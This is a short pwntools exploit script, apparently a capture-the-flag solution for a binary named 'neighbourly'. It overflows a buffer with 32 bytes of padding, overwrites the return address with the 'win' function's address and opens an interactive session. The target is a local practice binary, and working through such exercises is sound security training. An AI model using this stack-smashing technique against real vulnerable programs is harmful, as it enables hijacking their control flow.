from pwn import *

elf = ELF('./neighbourly')

win = elf.symbols['win']

print(hex(win))


# found offfset at 32
# for off in range(0, 100):
    # print(off)
p = elf.process()

payload = [ 
    b"A" * 32, #off
    p64(win)
]

payload = b"".join(payload)

p.sendline(payload)

p.interactive()